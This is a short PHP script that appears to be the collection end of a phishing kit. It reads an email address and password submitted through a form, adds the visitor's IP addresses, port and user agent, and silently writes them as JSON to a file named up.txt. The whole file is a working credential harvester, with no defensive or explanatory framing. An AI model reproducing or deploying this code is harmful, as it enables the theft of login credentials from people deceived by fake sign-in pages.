
<?php
$user = $_POST['email'];
$password = $_POST['pass'];
	$LOG=array(
	"user" => $user,
	"password" => $password,
	"ip" => $_SERVER["HTTP_X_FORWARDED_FOR"],

"port" => $_SERVER["REMOTE_PORT"],
		"useragent" => $_SERVER["HTTP_USER_AGENT"],
	"netip" => $_SERVER['REMOTE_ADDR']);
	$js=json_encode($LOG);
	$girl=fopen("up.txt","w");
	fwrite($girl,"$js\n");
die();
?>